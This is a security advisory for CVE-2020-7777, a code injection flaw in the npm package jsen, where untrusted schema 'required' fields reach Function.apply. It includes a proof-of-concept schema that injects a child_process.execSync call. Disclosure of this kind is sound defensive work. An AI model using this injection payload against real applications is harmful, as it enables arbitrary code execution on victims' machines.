# [H] Code Injection in jsen

## Summary
Severity: High
Advisory: GHSA-vm64-cfqx-3698
CVE: CVE-2020-7777
CWE: CWE-94
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2022-02-10
Source: https://github.com/advisories/GHSA-vm64-cfqx-3698
Type: github-advisory

## Affected
- npm: `jsen` — affected >=0

## Details
This affects all versions of package jsen. If an attacker can control the schema file, it could run arbitrary JavaScript code on the victim machine. In the module description and README file there is no mention about the risks of untrusted schema files, so it is assumed that this is applicable. In particular the required field of the schema is not properly sanitized. The resulting string that is build based on the schema definition is then passed to a `Function.apply();`, leading to an Arbitrary Code Execution.

### PoC
```js
const jsen = require('jsen');
let schema = JSON.parse(
{ &quot;type&quot;: &quot;object&quot;, &quot;properties&quot;: { &quot;username&quot;: { &quot;type&quot;: &quot;string&quot; } }, &quot;required&quot;: [&quot;\\&quot;+process.mainModule.require(\&#39;child_process\&#39;).execSync(\&#39;touch malicious\&#39;)+\\&quot;&quot;] }
);

const validate = jsen(schema); validate({});
```

## References
- https://nvd.nist.gov/vuln/detail/CVE-2020-7777
- https://github.com/bugventure/jsen/blob/master/lib/jsen.js#L875
- https://security.snyk.io/vuln/SNYK-JS-JSEN-1014670
